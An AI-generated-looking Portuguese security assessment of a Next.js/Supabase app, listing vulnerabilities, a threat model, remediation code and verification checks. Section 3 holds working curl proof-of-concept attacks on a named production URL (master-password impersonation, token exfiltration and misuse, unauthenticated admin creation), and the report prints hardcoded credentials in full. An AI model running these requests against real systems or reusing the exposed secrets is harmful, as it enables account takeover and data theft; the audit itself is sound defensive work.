# Relatório de Segurança — SoftcomHub AppSec Assessment
**Data:** 07 de abril de 2026
**Agente:** CyberSec Agent (AppSec Specialist)
**Classificação:** CONFIDENCIAL
**Escopo:** Next.js 16 + Supabase + Vercel

---

## 1. Relatório de Vulnerabilidades

| ID | Título | Severidade | OWASP 2021 | Arquivo:Linha | CVSS | Exploitabilidade |
|----|--------|------------|------------|---------------|------|-----------------|
| V-01 | Senha master hardcoded | CRÍTICO | A02 – Cryptographic Failures | `app/api/auth/master-login/route.ts:3` | 9.8 | Trivial |
| V-02 | Chave Evolution API hardcoded (3 arquivos) | CRÍTICO | A02 – Cryptographic Failures | `dispatch/route.ts:4-5`, `disparo-externo/route.ts:27`, `instance/create/route.ts:2` | 9.1 | Trivial |
| V-03 | Credenciais Basic Auth hardcoded | CRÍTICO | A02 – Cryptographic Failures | `lib/painel-auth.ts:2-3` | 9.1 | Trivial |
| V-04 | Endpoints admin sem autenticação (8 rotas) | CRÍTICO | A01 – Broken Access Control | Múltiplos `/api/admin/*`, `/api/colaborador/*`, `/api/tickets/*` | 9.8 | Trivial |
| V-05 | `/api/setor/lookup` expõe tokens sem auth | CRÍTICO | A01 – Broken Access Control | `app/api/setor/lookup/route.ts` | 9.1 | Trivial |
| V-06 | TypeScript ignoreBuildErrors em produção | ALTO | A05 – Security Misconfiguration | `next.config.mjs` | 7.5 | Moderada |
| V-07 | `/api/logs/error` sem auth + service_role | ALTO | A01 – Broken Access Control | `app/api/logs/error/route.ts` | 7.5 | Trivial |
| V-08 | `/api/upload` sem auth — 100MB público | ALTO | A01 – Broken Access Control | `app/api/upload/route.ts` | 7.5 | Trivial |
| V-09 | Webhook WhatsApp sem validação HMAC | ALTO | A07 – Identification & Auth Failures | `app/api/whatsapp/webhook/route.ts` | 7.3 | Moderada |
| V-10 | Evolution instance endpoints sem auth | ALTO | A01 – Broken Access Control | `app/api/evolution/instance/*` | 8.1 | Trivial |
| V-11 | Sem rate limiting em nenhum endpoint | MÉDIO | A05 – Security Misconfiguration | Global | 6.5 | Trivial |
| V-12 | Sem headers de segurança HTTP | MÉDIO | A05 – Security Misconfiguration | `next.config.mjs` | 5.3 | Moderada |
| V-13 | Sem RLS na tabela `error_logs` | MÉDIO | A01 – Broken Access Control | Supabase schema | 6.1 | Moderada |
| V-14 | Variáveis Supabase sem validação em runtime | MÉDIO | A05 – Security Misconfiguration | 2 dos 4 arquivos de cliente | 4.3 | Difícil |
| V-15 | Token Discord parcialmente logado | BAIXO | A09 – Security Logging Failures | `app/api/discord/send/route.ts` | 3.1 | Difícil |
| V-16 | NEXT_PUBLIC_ usado no service client | BAIXO | A05 – Security Misconfiguration | cliente service Supabase | 2.1 | Difícil |

---

## 2. Threat Model

### Atores de Ameaça

| Ator | Motivação | Capacidade | Vetor Provável |
|------|-----------|------------|----------------|
| Atacante externo / script kiddie | Vazamento de dados, venda de credenciais | Baixa–Média | Scanners automatizados, explorar endpoints públicos |
| Concorrente | Espionagem comercial | Média | Exfiltrar tokens via `/api/setor/lookup` |
| Atendente malicioso (insider) | Acesso fora do escopo | Baixa | Usar master password para logar como qualquer colaborador |
| Agente de phishing | Comprometer conta Meta/WhatsApp | Média | Roubar tokens, redirecionar webhooks |
| Bot / scraper | DoS financeiro, spam | Muito baixa | Flood em `/api/upload` |

### Superfícies de Ataque Críticas

```
Internet pública
     |
     +-- /api/admin/create-user          [sem auth → cria usuário qualquer]
     +-- /api/admin/delete-user          [sem auth → deleta usuário qualquer]
     +-- /api/setor/lookup               [sem auth → exfiltra tokens WA/Discord]
     +-- /api/auth/master-login          [senha pública → impersonação total]
     +-- /api/upload                     [sem auth → custo Vercel Blob ilimitado]
     +-- /api/logs/error                 [sem auth → flood banco com service_role]
     +-- /api/whatsapp/webhook           [sem HMAC → injeção de mensagens falsas]
     +-- /api/evolution/instance/create  [sem auth → criar instâncias WA externas]
```

### Cenários de Ataque Mais Prováveis

**Cenário A — Exfiltração total de tokens em 1 request:**
`GET /api/setor/lookup?identifier=suporte` retorna `whatsapp_token`, `evolution_api_key` e `discord_bot_token` em texto plano.

**Cenário B — Comprometimento do WhatsApp:**
Com `EVOLUTION_GLOBAL_API_KEY` hardcoded (exposta no histórico git), atacante acessa a Evolution API diretamente.

**Cenário C — Persistência via criação de usuário admin:**
`POST /api/admin/create-user` sem autenticação cria usuário com role elevada, mantendo acesso persistente.

**Cenário D — DoS Financeiro:**
Bot faz upload contínuo de arquivos de 100MB para `/api/upload`, inflando custos do Vercel Blob.

**Cenário E — Injeção de mensagens falsas:**
`POST /api/whatsapp/webhook` com payload fabricado injeta dados no banco sem validação de origem.

---

## 3. Prova de Conceito Simplificada

### PoC-01 — Impersonação via Master Password (V-01)

```bash
curl -X POST https://softcomhub.vercel.app/api/auth/master-login \
  -H "Content-Type: application/json" \
  -d '{"email": "gerente@empresa.com", "masterPassword": "K9#vT2!qZ7@Lp4$X"}'
# Resposta: sessão autenticada como gerente@empresa.com
```

---

### PoC-02 — Exfiltração de Tokens (V-05)

```bash
curl "https://softcomhub.vercel.app/api/setor/lookup?identifier=suporte"
# Resposta: {"whatsapp_token":"EAAxx...","evolution_api_key":"duukhYWk...","discord_bot_token":"MTxx..."}

# Usando token roubado para enviar mensagem como a empresa:
curl -X POST "https://graph.facebook.com/v18.0/1234567890/messages" \
  -H "Authorization: Bearer EAAxx..." \
  -d '{"messaging_product":"whatsapp","to":"5511999999999","type":"text","text":{"body":"Mensagem do atacante"}}'
```

---

### PoC-03 — Criação de Usuário Admin sem Autenticação (V-04)

```bash
curl -X POST https://softcomhub.vercel.app/api/admin/create-user \
  -H "Content-Type: application/json" \
  -d '{"email": "backdoor@atacante.com", "password": "Senha123!", "role": "admin"}'
# Resposta: usuário criado com service_role (bypassa RLS)
```

---

## 4. Plano de Remediação Urgente (24-72 horas)

### 4.0 — ANTES DE QUALQUER COISA: Rotacionar Credenciais

**Verificar histórico git:**
```bash
git log --all -S "K9#vT2" --oneline
git log --all -S "duukhYWk" --oneline
git log --all -S "S0ftc0m@API" --oneline
# Se encontradas: usar BFG Repo Cleaner para limpar o histórico
```

**Ordem de rotação:**
1. Revogar `EVOLUTION_GLOBAL_API_KEY` no painel da Evolution API
2. Regenerar tokens WhatsApp Cloud API no Meta Business
3. Revogar tokens Discord no Developer Portal
4. Alterar senha master
5. Alterar credenciais Basic Auth do painel

---

### 4.1 — Remover Credenciais Hardcoded

**ANTES — `app/api/auth/master-login/route.ts`:**
```typescript
const MASTER_PASSWORD = 'K9#vT2!qZ7@Lp4$X'
```

**DEPOIS — Opção A (mover para env):**
```typescript
// .env.local: MASTER_PASSWORD=<nova-senha-gerada>
const MASTER_PASSWORD = process.env.MASTER_PASSWORD

if (!MASTER_PASSWORD) {
  console.error('[master-login] MASTER_PASSWORD env var não configurada')
  return NextResponse.json({ error: 'Not available' }, { status: 503 })
}

// Comparação em tempo constante (evita timing attacks)
const crypto = await import('node:crypto')
const provided = Buffer.from(masterPassword ?? '')
const expected = Buffer.from(MASTER_PASSWORD)

if (provided.length !== expected.length || !crypto.timingSafeEqual(provided, expected)) {
  return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
}
```

**DEPOIS — Opção B (RECOMENDADA: remover o endpoint):**
```typescript
// app/api/auth/master-login/route.ts
export async function POST() {
  return NextResponse.json({ error: 'This endpoint has been decommissioned' }, { status: 410 })
}
```

---

**ANTES — `app/api/evolution/dispatch/route.ts`:**
```typescript
const EVOLUTION_GLOBAL_API_KEY = 'duukhYWk...[138 chars]'
```

**DEPOIS:**
```typescript
// .env.local: EVOLUTION_API_KEY=<nova-chave-após-rotação>
const EVOLUTION_GLOBAL_API_KEY = process.env.EVOLUTION_API_KEY
if (!EVOLUTION_GLOBAL_API_KEY) throw new Error('Evolution API credentials not configured')
```

**ANTES — `lib/painel-auth.ts`:**
```typescript
const PAINEL_USER = 'api_hub_prod'
const PAINEL_PASS = 'S0ftc0m@API#9Xv72!Lp'
```

**DEPOIS:**
```typescript
const PAINEL_USER = process.env.PAINEL_USER
const PAINEL_PASS = process.env.PAINEL_PASS
if (!PAINEL_USER || !PAINEL_PASS) throw new Error('Painel credentials not configured')
```

---

### 4.2 — Helper de Autenticação Reutilizável

```typescript
// lib/auth-guard.ts
import { createServerClient } from '@supabase/ssr'
import { cookies } from 'next/headers'
import { NextResponse } from 'next/server'

export async function requireAuth(options: { roles?: string[] } = {}) {
  const cookieStore = cookies()
  const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    { cookies: { get: (name) => cookieStore.get(name)?.value } }
  )

  const { data: { user }, error } = await supabase.auth.getUser()

  if (error || !user) {
    return {
      authenticated: false as const,
      response: NextResponse.json({ error: 'Unauthorized' }, { status: 401 }),
    }
  }

  const { data: colaborador } = await supabase
    .from('colaboradores')
    .select('role, status')
    .eq('user_id', user.id)
    .single()

  if (!colaborador || colaborador.status !== 'ativo') {
    return {
      authenticated: false as const,
      response: NextResponse.json({ error: 'Account inactive' }, { status: 403 }),
    }
  }

  if (options.roles && !options.roles.includes(colaborador.role)) {
    return {
      authenticated: false as const,
      response: NextResponse.json({ error: 'Forbidden' }, { status: 403 }),
    }
  }

  return { authenticated: true as const, user: { id: user.id, email: user.email!, role: colaborador.role } }
}
```

**Aplicar em todos os endpoints críticos:**
```typescript
// app/api/admin/create-user/route.ts
import { requireAuth } from '@/lib/auth-guard'

export async function POST(request: Request) {
  const auth = await requireAuth({ roles: ['admin', 'superadmin'] })
  if (!auth.authenticated) return auth.response
  // ... resto da lógica
}

// Para endpoints que só precisam de autenticação básica:
const auth = await requireAuth()
if (!auth.authenticated) return auth.response
```

---

### 4.3 — Proteger `/api/setor/lookup`

```typescript
import { requireAuth } from '@/lib/auth-guard'

export async function GET(request: Request) {
  const auth = await requireAuth()
  if (!auth.authenticated) return auth.response

  // ... buscar dados

  // NUNCA retornar tokens para o frontend
  return NextResponse.json({
    setor: data.nome,
    phone_number_id: data.phone_number_id,
    // tokens removidos da resposta pública
  })
}
```

---

### 4.4 — Validação HMAC no Webhook WhatsApp

```typescript
import { createHmac, timingSafeEqual } from 'node:crypto'

const APP_SECRET = process.env.WHATSAPP_APP_SECRET

export async function POST(request: Request) {
  const rawBody = await request.text() // ler como texto ANTES de .json()
  const signature = request.headers.get('x-hub-signature-256')

  if (!signature || !APP_SECRET) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
  }

  const expectedSignature = 'sha256=' + createHmac('sha256', APP_SECRET)
    .update(rawBody, 'utf8').digest('hex')

  const sigBuffer = Buffer.from(signature)
  const expectedBuffer = Buffer.from(expectedSignature)

  if (sigBuffer.length !== expectedBuffer.length || !timingSafeEqual(sigBuffer, expectedBuffer)) {
    console.warn('[WhatsApp Webhook] Invalid HMAC — possível ataque')
    return NextResponse.json({ error: 'Invalid signature' }, { status: 401 })
  }

  const body = JSON.parse(rawBody)
  await processWebhookEvent(body)
  return NextResponse.json({ status: 'ok' })
}
```

---

## 5. Plano de Hardening (1-4 semanas)

### 5.1 — Rate Limiting com Upstash

```bash
npm install @upstash/ratelimit @upstash/redis
```

```typescript
// middleware.ts
import { Ratelimit } from '@upstash/ratelimit'
import { Redis } from '@upstash/redis'

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(60, '1 m'),
})

const strictLimiter = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '1 m'),
})

const STRICT_PATHS = ['/api/auth/master-login', '/api/admin/', '/api/upload', '/api/logs/error']

export async function middleware(request: NextRequest) {
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0] ?? 'anonymous'
  const path = request.nextUrl.pathname
  const limiter = STRICT_PATHS.some(p => path.startsWith(p)) ? strictLimiter : ratelimit

  const { success, limit, reset, remaining } = await limiter.limit(ip)

  if (!success) {
    return NextResponse.json(
      { error: 'Too many requests', retryAfter: Math.ceil((reset - Date.now()) / 1000) },
      { status: 429, headers: {
        'X-RateLimit-Limit': limit.toString(),
        'X-RateLimit-Remaining': remaining.toString(),
        'Retry-After': Math.ceil((reset - Date.now()) / 1000).toString(),
      }}
    )
  }
  // ... resto do middleware
}
```

---

### 5.2 — Headers de Segurança HTTP

```javascript
// next.config.mjs
const nextConfig = {
  async headers() {
    return [{
      source: '/(.*)',
      headers: [
        { key: 'X-Frame-Options', value: 'DENY' },
        { key: 'X-Content-Type-Options', value: 'nosniff' },
        { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains; preload' },
        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=(), payment=()' },
        { key: 'Content-Security-Policy', value: [
          "default-src 'self'",
          "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
          "style-src 'self' 'unsafe-inline'",
          "img-src 'self' data: blob: *.vercel-storage.com",
          "connect-src 'self' *.supabase.co wss://*.supabase.co",
          "frame-ancestors 'none'",
        ].join('; ')},
        { key: 'Cross-Origin-Opener-Policy', value: 'same-origin' },
      ],
    }, {
      source: '/api/(.*)',
      headers: [
        { key: 'Cache-Control', value: 'no-store, no-cache, must-revalidate' },
      ],
    }]
  },
}
```

---

### 5.3 — RLS Policies para `error_logs`

```sql
ALTER TABLE error_logs ENABLE ROW LEVEL SECURITY;

-- Apenas admins autenticados podem ler logs da própria empresa
CREATE POLICY "admins_read_own_company_logs"
ON error_logs FOR SELECT TO authenticated
USING (
  empresa_id = (
    SELECT empresa_id FROM colaboradores
    WHERE user_id = auth.uid()
    AND role IN ('admin', 'superadmin')
    AND status = 'ativo'
    LIMIT 1
  )
);

-- Índices para performance
CREATE INDEX IF NOT EXISTS idx_error_logs_empresa_id ON error_logs(empresa_id);
CREATE INDEX IF NOT EXISTS idx_error_logs_created_at ON error_logs(created_at DESC);

-- Retenção automática via pg_cron (se disponível)
SELECT cron.schedule('cleanup-old-error-logs', '0 2 * * *',
  $$DELETE FROM error_logs WHERE created_at < NOW() - INTERVAL '90 days'$$);
```

---

### 5.4 — Basic Auth com Comparação em Tempo Constante

```typescript
// lib/painel-auth.ts
import { timingSafeEqual } from 'node:crypto'

export function validatePainelAuth(authHeader: string | null): boolean {
  if (!authHeader || !process.env.PAINEL_USER || !process.env.PAINEL_PASS) return false
  
  const base64 = authHeader.replace('Basic ', '')
  const [user, pass] = Buffer.from(base64, 'base64').toString('utf-8').split(':')
  
  if (!user || !pass) return false
  
  const userMatch = timingSafeEqual(
    Buffer.from(user.padEnd(64)), Buffer.from(process.env.PAINEL_USER.padEnd(64))
  )
  const passMatch = timingSafeEqual(
    Buffer.from(pass.padEnd(64)), Buffer.from(process.env.PAINEL_PASS.padEnd(64))
  )
  
  return userMatch && passMatch
}
```

---

## 6. Plano de Maturidade (1-6 meses)

### Mês 1-2 — WAF e Monitoramento
- Configurar Vercel WAF Firewall Rules (bloquear scanners, rate limit no edge)
- Integrar Sentry com `beforeSend` para sanitizar dados sensíveis
- Alertas de segurança no Supabase para logins suspeitos

### Mês 2-3 — Auditoria de Acessos

```sql
CREATE TABLE audit_log (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  user_id UUID REFERENCES auth.users(id),
  empresa_id UUID,
  action TEXT NOT NULL,
  resource_type TEXT,
  resource_id TEXT,
  ip_address INET,
  user_agent TEXT,
  metadata JSONB
);

ALTER TABLE audit_log ENABLE ROW LEVEL SECURITY;
-- Sem policy de DELETE/UPDATE = imutável via API
```

### Mês 3-4 — Gestão de Segredos
```bash
# Migrar para Vercel Environment Variables
vercel env add EVOLUTION_GLOBAL_API_KEY production
vercel env add MASTER_PASSWORD production
vercel env add WHATSAPP_APP_SECRET production
```

### Mês 4-6 — DevSecOps Pipeline

```yaml
# .github/workflows/security.yml
jobs:
  secrets-scan:
    steps:
      - uses: trufflesecurity/trufflehog@main
        with: { extra_args: --only-verified }
  
  dependency-audit:
    steps:
      - run: npm audit --audit-level=high
  
  sast:
    steps:
      - uses: returntocorp/semgrep-action@v1
        with: { config: "p/typescript p/nextjs p/owasp-top-ten" }
```

---

## 7. Checklist de Verificação

### Imediato (24-72h)

```bash
# Credenciais
git log --all -S "K9#vT2" --oneline          # deve retornar 0 resultados
git log --all -S "duukhYWk" --oneline        # deve retornar 0 resultados
git log --all -S "S0ftc0m@API" --oneline     # deve retornar 0 resultados

# Endpoints admin (devem retornar 401)
curl -s -o /dev/null -w "%{http_code}" -X POST https://softcomhub.vercel.app/api/admin/create-user
curl -s -o /dev/null -w "%{http_code}" -X POST https://softcomhub.vercel.app/api/admin/delete-user
curl -s -o /dev/null -w "%{http_code}" -X POST https://softcomhub.vercel.app/api/upload

# Lookup sem tokens (deve retornar 401 ou JSON sem tokens)
curl -s "https://softcomhub.vercel.app/api/setor/lookup?identifier=suporte" | jq 'has("whatsapp_token")'
# deve retornar false

# Webhook HMAC (deve retornar 403)
curl -s -o /dev/null -w "%{http_code}" -X POST https://softcomhub.vercel.app/api/whatsapp/webhook -d '{"test":1}'
```

### Hardening (1-4 semanas)

```bash
# Rate limiting (61 requests → 429)
for i in $(seq 1 65); do curl -s -o /dev/null -w "%{http_code}\n" https://softcomhub.vercel.app/; done

# Headers de segurança
curl -I https://softcomhub.vercel.app | grep -E "X-Frame-Options|X-Content-Type|Strict-Transport|Content-Security"
# Verificar com: https://securityheaders.com/?q=softcomhub.vercel.app
```

---

## Resumo Executivo

**Situação atual: CRÍTICA.**

O SoftcomHub possui 5 vulnerabilidades críticas que permitem comprometimento total da plataforma sem autenticação:

1. **Senha master hardcoded** → qualquer pessoa se autentica como qualquer usuário
2. **8 endpoints admin sem auth** → criação/deleção de usuários, manipulação de dados
3. **Tokens de API expostos publicamente** via `/api/setor/lookup` → acesso às contas WhatsApp dos clientes
4. **Chave Evolution API hardcoded** em 3 arquivos → controle total do gateway de mensagens
5. **Webhook WhatsApp sem HMAC** → injeção de mensagens falsas

**Ordem de prioridade:**

| Quando | Ação |
|--------|------|
| AGORA | Revogar e rotacionar TODAS as credenciais expostas |
| AGORA | Verificar histórico git por vazamentos anteriores |
| 24h | Proteger os 8 endpoints críticos com `requireAuth()` |
| 24h | Remover tokens da resposta do `/api/setor/lookup` |
| 48h | Implementar validação HMAC no webhook WhatsApp |
| 72h | Mover credenciais hardcoded para variáveis de ambiente |
| 1 semana | Rate limiting + headers de segurança |
| 2 semanas | RLS em `error_logs` + remover `ignoreBuildErrors` |

**O risco é extremamente alto para todos os clientes da plataforma** — não apenas para a Softcom, mas para cada empresa atendida, cujos tokens WhatsApp e dados de conversas estão expostos.
